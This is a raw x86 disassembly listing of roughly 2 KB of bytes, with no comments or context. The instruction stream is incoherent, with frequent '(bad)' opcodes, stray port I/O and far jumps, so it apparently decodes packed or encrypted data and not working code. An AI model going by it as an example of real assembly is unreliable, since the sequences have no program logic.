  414527:	mov    ebp,0x65f47fdd
  41452c:	pop    edx
  41452d:	adc    BYTE PTR [esi+0x6d3ebc00],0x18
  414534:	xor    ebp,DWORD PTR [ebp+0x30d7ba73]
  41453a:	add    dh,al
  41453c:	jp     0x4144c4
  41453e:	pop    ecx
  41453f:	jmp    eax
  414541:	xchg   ebx,eax
  414542:	dec    ebp
  414543:	and    bl,BYTE PTR [ebp+0x16fbe16c]
  414549:	mov    edx,0xd07ab47c
  41454e:	scas   al,BYTE PTR es:[edi]
  41454f:	and    DWORD PTR [esi+0x2c71f2d1],ebx
  414555:	cmp    ebp,edi
  414557:	xchg   edx,eax
  414558:	in     al,dx
  414559:	inc    edx
  41455a:	repz rol BYTE PTR [esi-0xee30430],0xc2
  414562:	adc    DWORD PTR [edx+0x7de8c037],ebp
  414568:	jne    0x4145c4
  41456a:	push   ss
  41456b:	mov    ebp,0x4ddd767c
  414570:	pop    es
  414571:	scas   al,BYTE PTR es:[edi]
  414572:	rcl    DWORD PTR [edx],1
  414574:	fistp  DWORD PTR [edi-0x70800cbe]
  41457a:	mov    edi,0xe45da5b6
  41457f:	sub    al,0x3a
  414581:	rcl    ebx,0x8e
  414584:	out    0x87,eax
  414586:	adc    esi,esp
  414588:	nop
  414589:	int3   
  41458a:	(bad)  
  41458b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458c:	in     eax,0x57
  41458e:	push   edi
  41458f:	mov    ds:0x5a2d7c29,eax
  414594:	ds xchg esp,eax
  414596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414597:	cmp    BYTE PTR [esi],dl
  414599:	cwde   
  41459a:	sbb    bh,BYTE PTR [ebx-0x2563799f]
  4145a0:	lods   eax,DWORD PTR ds:[esi]
  4145a1:	push   0xe05d2431
  4145a6:	xor    cl,BYTE PTR [eax+0x32]
  4145a9:	add    eax,DWORD PTR [edi-0x5e5a8136]
  4145af:	int3   
  4145b0:	stos   DWORD PTR es:[edi],eax
  4145b1:	xchg   ebp,eax
  4145b2:	aaa    
  4145b3:	repz es dec esi
  4145b6:	test   eax,0x716e4c23
  4145bb:	jg     0x41457c
  4145bd:	lods   al,BYTE PTR ds:[esi]
  4145be:	cli    
  4145bf:	shl    BYTE PTR [ebx],0xbd
  4145c2:	inc    ecx
  4145c3:	std    
  4145c4:	mov    DWORD PTR [edi],0x24f3d703
  4145ca:	fiadd  DWORD PTR [eax-0x253d7514]
  4145d0:	clc    
  4145d1:	sub    DWORD PTR [eax-0x70],edi
  4145d4:	loope  0x414649
  4145d6:	add    esp,eax
  4145d8:	xchg   edi,eax
  4145d9:	dec    edi
  4145da:	stc    
  4145db:	xor    BYTE PTR [edi-0x7844586c],dh
  4145e1:	jmp    0xb489baab
  4145e6:	sbb    eax,0xd500f2ff
  4145eb:	popa   
  4145ec:	sub    BYTE PTR [edx-0x4f0541f0],0xee
  4145f3:	das    
  4145f4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4145f6:	stos   BYTE PTR es:[edi],al
  4145f7:	mul    esi
  4145f9:	(bad)  
  4145fa:	mov    eax,ds:0x9dc0d9cf
  4145ff:	ins    BYTE PTR es:[edi],dx
  414600:	popf   
  414601:	push   0xdb37a514
  414606:	stos   BYTE PTR es:[edi],al
  414607:	(bad)  
  414608:	jo     0x414649
  41460a:	jl     0x4145ef
  41460c:	jg     0x41465c
  41460e:	pop    edi
  41460f:	xor    eax,0x51590e51
  414614:	jmp    DWORD PTR [ecx+0x56]
  414617:	adc    ebx,DWORD PTR [edx+0x6]
  41461a:	push   esi
  41461b:	lods   eax,DWORD PTR ds:[esi]
  41461c:	cmp    BYTE PTR cs:0xa65eabfd,0x57
  414624:	pop    esp
  414625:	cmp    al,0x4d
  414627:	dec    ecx
  414628:	popf   
  414629:	inc    ebp
  41462a:	enter  0x7543,0xef
  41462e:	dec    eax
  41462f:	jno    0x4145dd
  414631:	mov    DWORD PTR [ebx],edx
  414633:	addr16 mov eax,0x5b40a20e
  414639:	mov    DWORD PTR ds:0x642c5790,ebp
  41463f:	push   ebx
  414640:	xchg   DWORD PTR [esi-0x5246ee91],edx
  414646:	dec    edi
  414647:	lods   eax,DWORD PTR ds:[esi]
  414648:	xor    bh,cl
  41464a:	adc    eax,DWORD PTR [ebx-0x7b1a45eb]
  414650:	and    DWORD PTR [esi+0x3103a548],edx
  414656:	mov    eax,ds:0x907b4ac4
  41465b:	push   0xffffffdb
  41465d:	out    0x8,al
  41465f:	cmp    al,0x7a
  414661:	inc    ebp
  414662:	mov    ebp,eax
  414664:	jae    0x41468a
  414666:	div    BYTE PTR [ecx+0x1bfc964c]
  41466c:	push   edi
  41466d:	ds stos DWORD PTR es:[edi],eax
  41466f:	push   eax
  414670:	xor    eax,0xa92ef844
  414675:	popf   
  414676:	stos   BYTE PTR es:[edi],al
  414677:	les    eax,FWORD PTR [ebx]
  414679:	in     eax,0xff
  41467b:	xchg   ebp,eax
  41467c:	leave  
  41467d:	mov    DWORD PTR [ecx-0x5b],edx
  414680:	mov    WORD PTR [edx-0x211ea990],?
  414686:	push   DWORD PTR [edi+0x6c]
  414689:	jl     0x4146f0
  41468b:	clc    
  41468c:	fld    QWORD PTR [eax+0x23b2177e]
  414692:	repz shr DWORD PTR [edi+0x7a8d8b94],cl
  414699:	enter  0x2c98,0xfd
  41469d:	mov    edi,0x6cbc6cff
  4146a2:	mov    WORD PTR [edi-0xe],gs
  4146a5:	jnp    0x4146c8
  4146a7:	cmp    DWORD PTR [edi-0x732d259c],esi
  4146ad:	jae    0x41469f
  4146af:	cwde   
  4146b0:	call   0xba4e:0xbe38d5e3
  4146b7:	in     eax,dx
  4146b8:	ret    0xbe9b
  4146bb:	outs   dx,BYTE PTR ds:[esi]
  4146bc:	enter  0xeff9,0x62
  4146c0:	jp     0x414684
  4146c2:	mov    esp,0x77de7daa
  4146c7:	xor    BYTE PTR [eax-0x7562377c],0x7
  4146ce:	ja     0x4146ab
  4146d0:	mov    ch,0xa5
  4146d2:	int    0x1
  4146d4:	cmp    esp,edx
  4146d6:	scas   al,BYTE PTR es:[edi]
  4146d7:	mov    edi,0xeaaad4a
  4146dc:	in     eax,dx
  4146dd:	mov    ebx,0x440906b7
  4146e2:	ja     0x414750
  4146e4:	push   ss
  4146e5:	repz repz sbb DWORD PTR [edi-0x18],0xffffffb2
  4146eb:	xlat   BYTE PTR ds:[ebx]
  4146ec:	cdq    
  4146ed:	mov    BYTE PTR [eax],dh
  4146ef:	jmp    0xa33bffc
  4146f4:	mov    bl,0x4e
  4146f6:	dec    ecx
  4146f7:	xchg   esp,eax
  4146f8:	test   eax,0x3f449707
  4146fd:	retf   
  4146fe:	jl     0x414697
  414700:	pop    ss
  414701:	xchg   DWORD PTR [ebx],ebx
  414703:	jg     0x4146b6
  414705:	xchg   edi,edx
  414707:	sti    
  414708:	stos   BYTE PTR es:[edi],al
  414709:	xor    ch,bh
  41470b:	addr16 aaa 
  41470d:	lock cs push cs
  414710:	out    dx,al
  414711:	mov    eax,ds:0x4c0ad8d3
  414716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414717:	out    dx,al
  414718:	jmp    0xc3e0:0xa7c94a72
  41471f:	imul   eax,DWORD PTR [ebx-0x1094c943],0x17
  414726:	dec    ecx
  414727:	retf   0x98c4
  41472a:	(bad)
  41472e:	jge    0x4147a2
  414730:	push   esp
  414731:	jmp    0x2fd9:0x735c434
  414738:	cld    
  414739:	sbb    ebp,DWORD PTR [eax-0x2d88c194]
  41473f:	je     0x414743
  414741:	or     DWORD PTR [ecx],ebx
  414743:	test   DWORD PTR [ebx-0x26],eax
  414746:	mov    bh,0x8d
  414748:	shr    BYTE PTR [esi],cl
  41474a:	mov    cl,0xa9
  41474c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41474d:	jle    0x41479f
  41474f:	and    DWORD PTR [ebx+0x2a3c9a6e],esp
  414755:	inc    edi
  414756:	push   edi
  414757:	and    eax,0x74a33601
  41475c:	mov    bh,0xc3
  41475e:	sub    al,0x76
  414760:	shl    eax,1
  414762:	mov    ebx,0x877a7052
  414767:	mov    edx,esi
  414769:	div    DWORD PTR ss:[edi-0x11]
  41476d:	aam    0x70
  41476f:	rcl    DWORD PTR [esi],1
  414771:	sbb    bl,BYTE PTR [edx]
  414773:	loope  0x4147ea
  414775:	shl    BYTE PTR [ebx-0x5e81e2ee],1
  41477b:	enter  0x67de,0x3e
  41477f:	sub    al,0xaa
  414781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414782:	(bad)  
  414783:	jg     0x41479c
  414785:	sub    DWORD PTR ds:0x9616fcfd,ebx
  41478b:	push   esi
  41478c:	add    dh,BYTE PTR [esi-0x4e]
  41478f:	mov    ds:0xb8db639e,eax
  414794:	in     al,dx
  414795:	(bad)  
  414796:	(bad)  
  414797:	push   DWORD PTR [ebp-0x52]
  41479a:	xchg   DWORD PTR [ecx+0xc],edx
  41479d:	inc    ebp
  41479e:	sub    DWORD PTR [esp+edi*8],ecx
  4147a1:	xor    al,BYTE PTR [edi+0x7cdfa5bd]
  4147a7:	test   DWORD PTR [eax],eax
  4147a9:	out    dx,eax
  4147aa:	mov    ds,WORD PTR [eax]
  4147ac:	arpl   ax,sp
  4147ae:	lds    esp,FWORD PTR [ebx]
  4147b0:	adc    DWORD PTR [ecx],esi
  4147b2:	push   ecx
  4147b3:	jl     0x41476b
  4147b5:	test   cl,bh
  4147b7:	sbb    BYTE PTR [edi],0x52
  4147ba:	mov    BYTE PTR ds:0x3f03a73f,bh
  4147c0:	div    DWORD PTR [edi-0x7ea9a7a1]
  4147c6:	push   ss
  4147c7:	iret   
  4147c8:	add    ebp,0x1c0bb5cb
  4147ce:	js     0x4147d2
  4147d0:	fs out dx,al
  4147d2:	sbb    al,bl
  4147d4:	add    eax,0xd5511a88
  4147d9:	(bad)  
  4147da:	cmp    edi,esp
  4147dc:	cld    
  4147dd:	mov    al,0xa7
  4147df:	cwde   
  4147e0:	mov    ds:0x1bad0c2,eax
  4147e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e6:	inc    ebp
  4147e7:	or     al,0x4c
  4147e9:	or     esp,DWORD PTR [ecx-0x45]
  4147ec:	sbb    eax,0x1274a6c8
  4147f1:	mov    DWORD PTR [edi-0xd],0x83cecda9
  4147f8:	loop   0x41481a
  4147fa:	xor    eax,0x6540f4cf
  4147ff:	add    BYTE PTR [edx+ebp*1+0x34],cl
  414803:	ficomp DWORD PTR [esi+0x4e]
  414806:	mov    esi,0xd218a0cd
  41480b:	pop    es
  41480c:	xor    eax,0x7101e66e
  414811:	mov    edi,0xd392f1a6
  414816:	push   0xfffffff7
  414818:	popf   
  414819:	dec    edx
  41481a:	int3   
  41481b:	xor    DWORD PTR [ebx-0x34a5bd72],esi
  414821:	ror    DWORD PTR [ebx],cl
  414823:	lds    esi,FWORD PTR [edx]
  414825:	pop    ecx
  414826:	cli    
  414827:	cdq    
  414828:	ret    
  414829:	xchg   esi,eax
  41482a:	and    DWORD PTR [ebx-0x64],0xffffffbc
  41482e:	sbb    eax,0x3a60b782
  414833:	in     eax,0x8d
  414835:	and    al,0x61
  414837:	outs   dx,DWORD PTR ds:[esi]
  414838:	in     eax,0xd5
  41483a:	mov    eax,ds:0x64834c4d
  41483f:	je     0x414868
  414841:	jae    0x414881
  414843:	jmp    0x5c89:0x24c52184
  41484a:	pop    edx
  41484b:	dec    esp
  41484c:	xor    bh,BYTE PTR [edx]
  41484e:	aam    0x6b
  414850:	stc    
  414851:	sub    ah,ch
  414853:	bound  esi,QWORD PTR [edi+0xa]
  414856:	sub    al,0xad
  414858:	mov    BYTE PTR [eax-0x7eb43fad],ah
  41485e:	jmp    0x53f5:0xdd94cf79
  414865:	aad    0xa2
  414867:	dec    edx
  414868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414869:	xor    ah,BYTE PTR [ecx+0x699b6905]
  41486f:	stos   BYTE PTR es:[edi],al
  414870:	mov    al,ds:0x266a20c9
  414875:	leave  
  414876:	ret    
  414877:	div    eax
  414879:	ror    BYTE PTR [ebx+0x6d],cl
  41487c:	jns    0x4148c7
  41487e:	int3   
  41487f:	sahf   
  414880:	mov    bl,dl
  414882:	xchg   edx,eax
  414883:	aas    
  414884:	pop    eax
  414885:	ds pop esp
  414887:	and    BYTE PTR [ecx-0x68706e1a],dh
  41488d:	xchg   ebx,eax
  41488e:	cmp    BYTE PTR [eax+0x59],bh
  414891:	mov    BYTE PTR [ecx+0x58080fb9],ah
  414897:	fcomp  st(2)
  414899:	cli    
  41489a:	loop   0x414859
  41489c:	push   esi
  41489d:	loop   0x4148fd
  41489f:	fbstp  TBYTE PTR [esi+ebp*4]
  4148a2:	pop    es
  4148a3:	jbe    0x41486b
  4148a5:	sbb    BYTE PTR [ebp-0x63f70726],ch
  4148ab:	push   edi
  4148ac:	in     eax,dx
  4148ad:	ror    DWORD PTR [eax-0x22e94219],1
  4148b3:	(bad)  
  4148b4:	push   ss
  4148b5:	push   eax
  4148b6:	inc    esp
  4148b7:	retf   0x32f8
  4148ba:	sub    DWORD PTR ds:[edx],edx
  4148bd:	into   
  4148be:	lock ja 0x41485f
  4148c1:	and    al,0x1d
  4148c3:	pop    esi
  4148c4:	xchg   DWORD PTR [esi],esi
  4148c6:	out    0xdb,al
  4148c8:	ret    
  4148c9:	pop    ss
  4148ca:	cmc    
  4148cb:	jno    0x414896
  4148cd:	outs   dx,DWORD PTR ds:[esi]
  4148ce:	ffree  st(1)
  4148d0:	xor    bl,cl
  4148d2:	fcomp  DWORD PTR [ebp-0x8]
  4148d5:	cmp    eax,0x536d25e6
  4148da:	aad    0x51
  4148dc:	arpl   WORD PTR [edi-0x2c832bfe],bx
  4148e2:	xchg   dh,bh
  4148e4:	ins    DWORD PTR es:[edi],dx
  4148e5:	inc    ecx
  4148e6:	and    BYTE PTR fs:[ecx+0x21],dh
  4148ea:	jg     0x414905
  4148ec:	nop
  4148ed:	mov    fs,WORD PTR [edx-0x60]
  4148f0:	or     DWORD PTR [esi+esi*4],eax
  4148f3:	leave  
  4148f4:	add    eax,0xbfa70779
  4148f9:	sbb    al,0xde
  4148fb:	(bad)  
  4148fc:	sub    BYTE PTR [ebx+0x6d84a9c9],ch
  414902:	jmp    0xd08e86c9
  414907:	cwde   
  414908:	dec    esi
  414909:	pop    eax
  41490a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41490b:	jp     0x414913
  41490d:	mov    dl,0x90
  41490f:	push   es
  414910:	xchg   edx,eax
  414911:	rcl    bh,cl
  414913:	jmp    0x5ba1:0xbbc55721
  41491a:	push   0xffffffb1
  41491c:	pop    edi
  41491d:	adc    dh,BYTE PTR [esi+0x5c]
  414920:	xor    eax,DWORD PTR ds:0x56cfd85f
  414926:	rcr    BYTE PTR [ebp+0x2a],1
  414929:	push   0xfffffff3
  41492b:	jecxz  0x414962
  41492d:	ins    DWORD PTR es:[edi],dx
  41492e:	mov    DWORD PTR [edi+0x164721b6],ebx
  414934:	mov    dh,0xa4
  414936:	jp     0x414920
  414938:	(bad)  
  414939:	fsubr  st,st(7)
  41493b:	rcl    DWORD PTR [edi],cl
  41493d:	ds push eax
  41493f:	and    BYTE PTR [esi+ebx*2+0x7b],al
  414943:	jecxz  0x41491e
  414945:	sbb    esp,DWORD PTR [ecx]
  414947:	sub    BYTE PTR [ebx+ebp*1],ah
  41494a:	mov    ds:0x419788f,al
  41494f:	mov    bl,0xfd
  414951:	rcl    BYTE PTR [eax],0xfe
  414954:	xchg   DWORD PTR [ecx-0x6],esp
  414957:	pop    eax
  414958:	sbb    al,BYTE PTR [ecx]
  41495a:	retf   
  41495b:	call   0xd08d:0x9e86defa
  414962:	ficomp WORD PTR [ebp+0x7e]
  414965:	std    
  414966:	enter  0xeca1,0xc7
  41496a:	xchg   ebp,eax
  41496b:	or     ecx,DWORD PTR [ecx-0xa]
  41496e:	dec    esp
  41496f:	or     eax,0xef2252b8
  414974:	std    
  414975:	mov    eax,ds:0xf3079643
  41497a:	in     al,dx
  41497b:	cmp    ah,BYTE PTR [ecx+esi*2+0x33b186bf]
  414982:	aam    0xf4
  414984:	icebp  
  414985:	push   0xffffffc0
  414987:	stos   DWORD PTR es:[edi],eax
  414988:	das    
  414989:	mov    dh,0x57
  41498b:	push   cs
  41498c:	js     0x4149eb
  41498e:	out    0xf,eax
  414990:	ins    DWORD PTR es:[edi],dx
  414991:	cmp    eax,0x8df66845
  414996:	mov    ebx,0xd2eec34a
  41499b:	or     DWORD PTR [ecx+0x10],ecx
  41499e:	and    DWORD PTR [esi+0x4a],edi
  4149a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a2:	and    eax,ebp
  4149a4:	loopne 0x4149b7
  4149a6:	dec    ebx
  4149a7:	sub    ah,dl
  4149a9:	xchg   edx,eax
  4149aa:	xor    ecx,0x5f81e1e5
  4149b0:	loope  0x4149bf
  4149b2:	inc    eax
  4149b3:	xor    ah,BYTE PTR [esi+0x7ee88453]
  4149b9:	jl     0x414a22
  4149bb:	je     0x414999
  4149bd:	pushf  
  4149be:	jle    0x414980
  4149c0:	pop    es
  4149c1:	sub    BYTE PTR ds:[esp+ebp*1-0xb],ah
  4149c6:	(bad)  
  4149c8:	(bad)  
  4149c9:	sbb    BYTE PTR [ebx],cl
  4149cb:	mov    edx,0x11e6f2c6
  4149d0:	pop    edi
  4149d1:	aad    0x77
  4149d3:	cli    
  4149d4:	outs   dx,BYTE PTR ds:[esi]
  4149d5:	jnp    0x41499b
  4149d7:	data16 ja 0x414a27
  4149da:	mov    ecx,0x73aa1007
  4149df:	xchg   ebx,eax
  4149e0:	mov    ebx,0x2a80485b
  4149e5:	mov    bh,0xd0
  4149e7:	mov    dh,0xd
  4149e9:	rcl    DWORD PTR [ecx],1
  4149eb:	adc    dh,BYTE PTR [edi+0x60]
  4149ee:	xchg   edx,eax
  4149ef:	and    dl,BYTE PTR [esi]
  4149f1:	push   eax
  4149f2:	daa    
  4149f3:	push   es
  4149f4:	imul   ebx,DWORD PTR [ebx-0x5c],0x5e
  4149f8:	cmc    
  4149f9:	mov    ah,0x98
  4149fb:	push   ecx
  4149fc:	daa    
  4149fd:	adc    DWORD PTR [esi],ecx
  4149ff:	scas   eax,DWORD PTR es:[edi]
  414a00:	adc    ebx,DWORD PTR [edx]
  414a02:	in     al,0x3f
  414a04:	and    cl,dh
  414a06:	xlat   BYTE PTR ds:[ebx]
  414a07:	outs   dx,BYTE PTR ds:[esi]
  414a08:	fidiv  WORD PTR [esi]
  414a0a:	jo     0x414a59
  414a0c:	mov    BYTE PTR [edi],dl
  414a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0f:	cmp    dh,BYTE PTR [ebp-0x5e]
  414a12:	sahf   
  414a13:	fadd   QWORD PTR [esi-0x14b8eef5]
  414a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a1b:	push   edi
  414a1c:	jmp    0x1154609e
  414a21:	pop    edi
  414a22:	add    al,0x45
  414a24:	mov    ebp,0xeae2c31
  414a29:	leave  
  414a2a:	add    edx,eax
  414a2c:	xor    al,0xa4
  414a2e:	cmp    al,0xec
  414a30:	fsubr  QWORD PTR [eax+0x7a]
  414a33:	push   cx
  414a35:	xor    DWORD PTR [edi-0x1],esp
  414a38:	mov    ebp,edi
  414a3a:	leave  
  414a3b:	rol    DWORD PTR [edx],0xe8
  414a3e:	adc    al,bl
  414a40:	mov    al,ds:0x928fbd89
  414a45:	mov    dh,0x27
  414a47:	mov    edi,0xf0477e63
  414a4c:	(bad)  
  414a4d:	mov    bh,0x38
  414a4f:	or     eax,0x36c81368
  414a54:	sbb    al,0x64
  414a56:	mov    ds:0x8a45178,eax
  414a5b:	dec    ecx
  414a5c:	mov    gs,WORD PTR [edx+0x5cfc3b31]
  414a62:	dec    esp
  414a63:	ficom  DWORD PTR [edi]
  414a65:	and    cl,bh
  414a67:	sub    BYTE PTR [ebx],0xdf
  414a6a:	cli    
  414a6b:	lods   al,BYTE PTR ds:[esi]
  414a6c:	in     eax,0x2b
  414a6e:	mov    al,ds:0x4f90ac89
  414a73:	dec    edi
  414a74:	das    
  414a75:	add    ecx,edi
  414a77:	or     al,0x8d
  414a79:	outs   dx,DWORD PTR ds:[esi]
  414a7a:	mov    es,WORD PTR [ebp+0x5c216794]
  414a80:	xchg   DWORD PTR [eax+ebx*1-0xb],ebp
  414a84:	int3   
  414a85:	adc    eax,0x71761fe6
  414a8a:	adc    eax,0xac0f901d
  414a8f:	(bad)
  414a92:	mov    ah,0x10
  414a94:	jno    0x414a96
  414a96:	inc    ebp
  414a97:	mov    bl,0xbf
  414a99:	mov    cl,ch
  414a9b:	mov    bh,BYTE PTR [ebp+0x210dd86c]
  414aa1:	fs push edx
  414aa3:	stos   DWORD PTR es:[edi],eax
  414aa4:	mov    esi,0x8436affc
  414aa9:	sti    
  414aaa:	cwde   
  414aab:	hlt    
  414aac:	dec    ebp
  414aad:	jb     0x414a75
  414aaf:	xchg   ecx,eax
  414ab0:	pop    ebp
  414ab1:	dec    edi
  414ab2:	pop    ebp
  414ab3:	xchg   ebx,eax
  414ab4:	fs push edi
  414ab6:	push   0xffffffb7
  414ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab9:	aas    
  414aba:	dec    DWORD PTR [ecx-0xe]
  414abd:	daa    
  414abe:	mov    ecx,0xee3edfae
  414ac3:	stos   DWORD PTR es:[edi],eax
  414ac4:	das    
  414ac5:	(bad)  
  414ac6:	les    ecx,FWORD PTR [ebx+0xa4ddc2]
  414acc:	inc    edi
  414acd:	mov    ds:0x538e3f68,eax
  414ad2:	pop    esp
  414ad3:	aaa    
  414ad4:	imul   edi,DWORD PTR [edx-0x12de0652],0x18c3cdf7
  414ade:	dec    esp
  414adf:	add    DWORD PTR [ecx-0x5],edx
  414ae2:	jnp    0x414a66
  414ae4:	arpl   WORD PTR [edi+0x64],bx
  414ae7:	int    0x12
  414ae9:	je     0x414b08
  414aeb:	ror    esp,1
  414aed:	push   edx
  414aee:	fist   WORD PTR [esi]
  414af0:	push   0x64
  414af2:	les    eax,FWORD PTR [ebx]
  414af4:	in     eax,0x9f
  414af6:	mov    al,0xb4
  414af8:	or     eax,0xc21cec01
  414afd:	mov    DWORD PTR [ecx+0x64a3a13b],edx
  414b03:	xchg   edi,eax
  414b04:	aas    
  414b05:	mov    edi,0x566bf8ba
  414b0a:	lahf   
  414b0b:	xor    BYTE PTR [ecx-0x4b428be2],ch
  414b11:	fbstp  TBYTE PTR [ebx+ebp*2-0x32840bbe]
  414b18:	jo     0x414b1f
  414b1a:	and    eax,0xd639fbcb
  414b1f:	mov    al,ds:0xabf7e552
  414b24:	(bad)  
  414b25:	cld    
  414b26:	loop   0x414b31
  414b28:	xor    al,dh
  414b2a:	test   al,0x1a
  414b2c:	fidiv  WORD PTR [esi]
  414b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b2f:	mov    bl,0x16
  414b31:	mov    al,ds:0xbe9314f8
  414b36:	in     eax,dx
  414b37:	adc    ecx,ebp
  414b39:	sti    
  414b3a:	ds and ebx,0xfffffff4
  414b3e:	std    
  414b3f:	clc    
  414b40:	data16 out dx,al
  414b42:	jbe    0x414b77
  414b44:	pop    ss
  414b45:	pop    es
  414b46:	clc    
  414b47:	push   0x2082b7ac
  414b4c:	xchg   edi,edx
  414b4e:	fdiv   st,st(0)
  414b50:	scas   al,BYTE PTR es:[edi]
  414b51:	addr16 or dl,dl
  414b54:	sub    esp,DWORD PTR [ebx]
  414b56:	(bad)  
  414b57:	push   esi
  414b58:	(bad)  
  414b59:	mov    eax,ds:0x463ba4db
  414b5e:	popf   
  414b5f:	cdq    
  414b60:	add    DWORD PTR [edx+0x47],eax
  414b63:	sbb    BYTE PTR [ebp+0x10],bl
  414b66:	retf   0xabec
  414b69:	mov    dh,0x19
  414b6b:	adc    BYTE PTR [esp+ebx*1+0x0],cl
  414b6f:	cmp    eax,0x90c45a36
  414b74:	(bad)  
  414b75:	sub    eax,0xc6a7c9d2
  414b7a:	pusha  
  414b7b:	dec    eax
  414b7c:	out    0x32,al
  414b7e:	test   eax,0xc4c8813b
  414b83:	(bad)  
  414b84:	fwait
  414b85:	push   esi
  414b86:	mov    ch,0x76
  414b88:	sub    edx,DWORD PTR fs:[ecx-0x4]
  414b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b8d:	sahf   
  414b8e:	imul   ecx,DWORD PTR [edi+0x21241536],0x14
  414b95:	es mov esi,0x7c2072dc
  414b9b:	jno    0x414c13
  414b9d:	pop    eax
  414b9e:	cmc    
  414b9f:	push   ebp
  414ba0:	out    0x34,al
  414ba2:	retf   
  414ba3:	xlat   BYTE PTR ds:[ebx]
  414ba4:	pop    ebp
  414ba5:	sbb    ah,bl
  414ba7:	bnd call 0x5c2e4e3
  414bad:	xor    ecx,DWORD PTR [eax+edx*1-0x544f66c2]
  414bb4:	(bad)  
  414bb5:	or     eax,0xab2b7b70
  414bba:	pop    cx
  414bbc:	inc    edx
  414bbd:	(bad)  
  414bbf:	fbstp  TBYTE PTR [ebx]
  414bc1:	fs jnp 0x414c40
  414bc4:	pushf  
  414bc5:	jne    0x414bf9
  414bc7:	mov    ds:0xe55e66cd,al
  414bcc:	pusha  
  414bcd:	dec    edi
  414bce:	js     0x414b70
  414bd0:	jae    0x414ba2
  414bd2:	dec    eax
  414bd3:	adc    eax,0x9f450b22
  414bd8:	shl    DWORD PTR [edx-0x76],cl
  414bdb:	mov    ds:0x7dcd63fb,al
  414be0:	retf   
  414be1:	(bad)  
  414be2:	jmp    0x414c38
  414be4:	mov    ah,0x92
  414be6:	(bad)  [edx+0x73]
  414be9:	mov    bl,0xe7
  414beb:	pop    ds
  414bec:	lahf   
  414bed:	inc    edx
  414bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bef:	jecxz  0x414b84
  414bf1:	(bad)  
  414bf2:	cdq    
  414bf3:	cmp    al,0xd9
  414bf6:	fcomi  st,st(5)
  414bf8:	inc    edi
  414bf9:	in     eax,dx
  414bfa:	dec    ebx
  414bfb:	and    eax,0x6c90fb79
  414c00:	call   0xee20:0x6f2045c9
  414c07:	mov    al,ds:0xe6041af7
  414c0c:	inc    esp
  414c0d:	and    BYTE PTR [eax-0x5],dl
  414c10:	rcr    BYTE PTR [ebx-0x29],1
  414c13:	pusha  
  414c14:	stos   BYTE PTR es:[edi],al
  414c15:	and    ecx,DWORD PTR [ecx]
  414c17:	dec    esi
  414c18:	pop    ebp
  414c19:	clc    
  414c1a:	xor    dl,bl
  414c1c:	fdivr  QWORD PTR [eax-0x37]
  414c1f:	push   0xe16b9aaf
  414c24:	lea    eax,[edi+0x72]
  414c27:	mov    ah,0x10
  414c29:	out    dx,eax
  414c2a:	fcmovnb st,st(5)
  414c2c:	loope  0x414c9a
  414c2e:	retf   0x47d4
  414c31:	sar    ecx,0x57
  414c34:	mov    cl,0x2e
  414c36:	push   ds
  414c37:	imul   ebp,DWORD PTR [edi],0xffffffea
  414c3a:	gs pop ebx
  414c3c:	in     al,0x53
  414c3e:	mov    ds:0x7b69432f,al
  414c44:	inc    eax
  414c45:	ins    BYTE PTR es:[edi],dx
  414c46:	ins    DWORD PTR es:[edi],dx
  414c47:	stos   BYTE PTR es:[edi],al
  414c48:	xchg   ecx,eax
  414c49:	retf   0x74aa
  414c4c:	nop
  414c4d:	push   0x4d
  414c4f:	jle    0x414c8f
  414c51:	jg     0x414c4e
  414c53:	call   0x3b155817
  414c58:	outs   dx,BYTE PTR ds:[esi]
  414c59:	lea    ebx,[ebx-0x7985b915]
  414c5f:	sub    dl,BYTE PTR [ecx*4+0xe423b5e]
  414c66:	mov    esi,0x9ed0973
  414c6b:	mov    ebp,0x91837bfe
  414c70:	dec    edx
  414c71:	cwde   
  414c72:	xor    DWORD PTR [eax*1+0x1163c313],esi
  414c79:	pop    ecx
  414c7a:	mov    WORD PTR [edx-0x43de185c],cs
  414c80:	hlt    
  414c81:	adc    ecx,DWORD PTR [esi-0x583dc936]
  414c87:	and    ebp,esi
  414c89:	sbb    al,0x9c
  414c8b:	mov    cl,0xe5
  414c8d:	pop    ds
  414c8e:	mov    ebx,DWORD PTR [edx*2-0x518850b2]
  414c95:	out    dx,al
  414c96:	sbb    ebx,DWORD PTR [esi]
  414c98:	enter  0x66f8,0xab
  414c9c:	cld    
  414c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9e:	test   eax,0x148df37a
  414ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca4:	pushf  
  414ca5:	adc    dh,BYTE PTR [ecx+0x30]
  414ca8:	xchg   ebx,eax
  414ca9:	mov    ebx,0x74605521
  414cae:	sub    edi,DWORD PTR [esi+0x7cb38bdb]
  414cb4:	sbb    edi,0xffffffe3
  414cb7:	jl     0x414c85
  414cb9:	std    
  414cba:	mov    ecx,0xe85bf3db
  414cbf:	cmp    esp,DWORD PTR [ebp-0x45e6eca1]
  414cc5:	jno    0x414d23
  414cc7:	xchg   ebx,eax
  414cc8:	and    al,0x94
  414cca:	add    eax,0xbeb67f89
  414ccf:	mov    dl,0xb5
  414cd1:	aam    0x77
  414cd3:	mov    edx,0x14d02dac
  414cd8:	adc    ch,BYTE PTR [edi-0x32]
  414cdb:	retf   
  414cdc:	mov    esi,esi
  414cde:	icebp  
  414cdf:	dec    ebx
  414ce0:	mov    cl,0x4e
  414ce2:	push   0x74728131
  414ce7:	pushf  
  414ce8:	and    al,0xb0
  414cea:	daa    
